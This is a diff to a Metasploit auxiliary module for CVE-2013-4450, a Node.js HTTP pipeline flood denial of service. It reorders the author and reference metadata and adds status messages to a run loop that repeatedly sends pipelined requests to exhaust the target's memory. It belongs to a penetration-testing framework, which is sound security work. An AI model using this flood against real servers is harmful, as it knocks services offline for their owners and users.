@@ -20,14 +20,19 @@ class Metasploit3 < Msf::Auxiliary
         HTTP requests on a single connection, which causes unbounded memory
         allocation when the client does not read the responses.
       },
-      'Author'         => [ 'titanous', 'Marek Majkowski', 'joev' ],
+      'Author'         =>
+        [
+          'Marek Majkowski', # Vulnerability discovery
+          'titanous',        # Metasploit module
+          'joev'             # Metasploit module
+        ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
-          [ 'URL', 'http://blog.nodejs.org/2013/10/22/cve-2013-4450-http-server-pipeline-flood-dos' ],
           [ 'CVE', '2013-4450' ],
           [ 'OSVDB', '98724' ],
           [ 'BID' , '63229' ],
+          [ 'URL', 'http://blog.nodejs.org/2013/10/22/cve-2013-4450-http-server-pipeline-flood-dos' ]
         ],
       'DisclosureDate' => 'Oct 18 2013'))
 
@@ -70,12 +75,14 @@ class Metasploit3 < Msf::Auxiliary
   def run
     payload = http_request
     begin
+      print_status("Stressing the target memory...")
       connect
       datastore['RLIMIT'].times { sock.put(payload) }
+      print_status("Attack finished. If you read it, it wasn't enough to trigger an Out Of Memory condition.")
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
       print_status("Unable to connect to #{host}.")
     rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
-      print_status("DoS successful. #{host} not responding.")
+      print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached")
     ensure
       disconnect
     end
